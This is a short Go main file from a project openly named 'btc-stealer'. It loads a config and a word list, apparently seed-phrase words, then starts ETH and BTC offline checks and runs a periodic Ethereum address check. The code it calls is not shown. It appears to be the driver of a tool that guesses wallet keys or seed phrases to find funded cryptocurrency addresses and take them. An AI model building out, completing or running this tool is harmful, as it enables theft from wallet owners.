package main

import (
	"btc-stealer/btc"
	"btc-stealer/common"
	"btc-stealer/eth"
	"encoding/json"
	"os"
	"time"
)

func init() {

	file, err := os.ReadFile("config.json")
	if err != nil {
		panic(err)
	}

	var cfg common.Config
	if err = json.Unmarshal(file, &cfg); err != nil {
		panic(err)
	}

	common.InitConfig(&cfg)
	common.SetWords(cfg.WordsList)
}

// RunETHCheck through debugging, we found that the average request response is about 1 second. So set the execution period to 3 seconds
func RunETHCheck() {
	ticker := time.NewTicker(time.Second * 3)
	for range ticker.C {
		eth.AddressETHCheck()
	}
}

func main() {

	go eth.RunETHOfflineCheck()
	go btc.RunBTCOfflineCheck()

	if common.GetMode() == common.ModeOffline {
		select {}
	}

	RunETHCheck()
}
